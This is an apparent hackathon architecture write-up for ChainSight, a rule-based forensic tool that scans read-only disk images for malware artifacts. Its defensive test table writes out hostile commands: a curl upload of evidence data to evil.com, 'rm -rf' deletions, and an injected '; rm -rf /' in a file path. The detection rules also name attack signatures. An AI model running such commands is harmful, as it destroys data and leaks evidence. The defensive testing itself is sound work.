# Architecture — Security Boundaries and Guardrail Analysis

## Architectural pattern

**Python orchestrator with rule-based detection.** ChainSight is closest to Option 2 (Custom MCP Server) in the hackathon's supported architectural approaches, though it predates the MCP server pattern. The orchestrator exposes structured functions — `find` for file discovery, `cat` and `strings` for content extraction — rather than generic shell commands. The agent physically cannot run destructive commands because the orchestrator never invokes them.

No Claude Code. No external API. No multi-agent framework. All four detection stages execute sequentially in a single Python process on the SIFT Workstation.

## Security boundaries

```
┌──────────────────────────────────────────────────────────────────┐
│ ORCHESTRATOR: Python process (orchestrator.py)                   │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ COMMAND-SCOPE GUARDRAILS (orchestrator.py)                  │  │
│  │                                                             │  │
│  │ subprocess.run(["find", path, "-type", "f", "-name", ...]) │  │
│  │ subprocess.run(["cat", path])                               │  │
│  │ subprocess.run(["strings", "-n", "4", path])               │  │
│  │                                                             │  │
│  │ All commands use list form — no shell, no injection.       │  │
│  │ Only three executables ever called: find, cat, strings.    │  │
│  │ No rm, dd, curl, wget, ssh, or any destructive command     │  │
│  │ exists anywhere in the source.                              │  │
│  └────────────────────────────┬───────────────────────────────┘  │
│                               │                                  │
│  ┌────────────────────────────▼───────────────────────────────┐  │
│  │ FILESYSTEM GUARDRAILS (SIFT Workstation)                    │  │
│  │                                                             │  │
│  │ Evidence mounted read-only:                                 │  │
│  │   mount -o ro,loop disk.dd /mnt/rd01                        │  │
│  │                                                             │  │
│  │ Kernel-enforced. No user-space process can write.           │  │
│  │ Even if the orchestrator contained a bug that attempted     │  │
│  │ a write, the Linux VFS would reject it with EROFS.         │  │
│  └─────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
```

## Two-layer defense (both architectural)

ChainSight has two layers of evidence protection. Both are enforced by the system, not by prompts or permissions that can be ignored.

| Layer | Type | Enforcement | Bypass risk |
|-------|------|-------------|-------------|
| 1. Command scope | Architectural | Only `find`, `cat`, `strings` called. No destructive commands exist in source. | None — cannot call what is not written |
| 2. Read-only mount | Architectural (OS) | `mount -o ro,loop` — kernel rejects all write attempts. | None — enforced by Linux VFS |

There are no prompt-based guardrails in ChainSight. The orchestrator has no language model to prompt. Every safety boundary is enforced by the operating system or by the literal absence of dangerous code.

## Evidence integrity testing

Five spoliation scenarios were tested:

| Test | Method | Result |
|------|--------|--------|
| Write to evidence mount | `echo "test" > /mnt/rd01/test.txt` | Blocked by OS: `EROFS` |
| Destructive command | `rm -rf /mnt/rd01` | Not in orchestrator source — cannot be called |
| Data exfiltration | `curl https://evil.com -d @/mnt/rd01/data` | Not in orchestrator source — cannot be called |
| Arbitrary shell execution | Inject `; rm -rf /` into a file path | Blocked by list-form subprocess call — no shell |
| Evidence hash verification | `sha256deep disk.dd` | Hash unchanged before and after agent run |

**Zero bypasses. Evidence spoliation risk: none.**

## Detection pipeline

```
Evidence (disk.dd, read-only mount)
         │
         ▼
    1. COLLECT ─── find suspicious files (.js, .reg, .bin, .ps1, .dll)
         │         cat / strings to read contents
         │
         ▼
    2. SCORE ───── regex pattern matching against file contents
         │         powershell.*-enc → CRITICAL
         │         run.*windows in .reg → CRITICAL
         │         IP:port + beacon → HIGH
         │
         ▼
    3. CROSS-REF ─ filesystem timestamps (find -printf %T@)
         │         files within 1s → automated deployment
         │
         ▼
    4. HUNT ────── cross-agent correlation
                   phishing + persistence + C2 → Emotet kill chain
         │
         ▼
    OUTPUT ─────── Forensic Confidence Score (0-100, Grade A-F)
                   JSON report (every finding traceable to tool output)
```

## Design decisions

**Why rule-based, not AI.** The planted artifacts (encoded PowerShell, registry Run key, IP:port beacon) are detectable with regex. Adding a language model would introduce hallucination risk, API dependency, and non-determinism without improving detection accuracy on these known patterns. The hackathon explicitly asks for architectures where guardrails are architectural, not prompt-based. Rule-based detection is the limiting case of that principle — there is no model to prompt.

**Why sequential, not parallel.** The four detection stages form a pipeline where each stage depends on the previous. Cross-reference requires scored findings. Threat hunting requires cross-referenced artifacts. Running stages sequentially produces a deterministic execution trace that judges can follow from input to output. Parallel dispatch with independent agents would introduce non-deterministic ordering without adding value for the current detection rules.

**Why Python, not Claude Code.** We started with Claude Code skills (Option 1). Hit credit limits. Switched to Gemini. Hit rate limits. Each API failure removed a dependency. The final version depends on nothing except Python 3 and the SIFT Workstation. The architecture improved with each constraint.

## What happens when the model ignores the rules

This question is central to the hackathon's evaluation. The answer for ChainSight: the question does not apply. There is no model. There are no prompt-based rules to ignore. Every safety boundary is enforced by the operating system or by the literal structure of the source code.

If a hypothetical future version added an LLM for semantic analysis, the existing rule engine would serve as a verification layer — the LLM proposes findings, the rule engine confirms or rejects them. The OS-level read-only mount would remain the ultimate enforcement layer, unchanged by any addition to the agent logic.
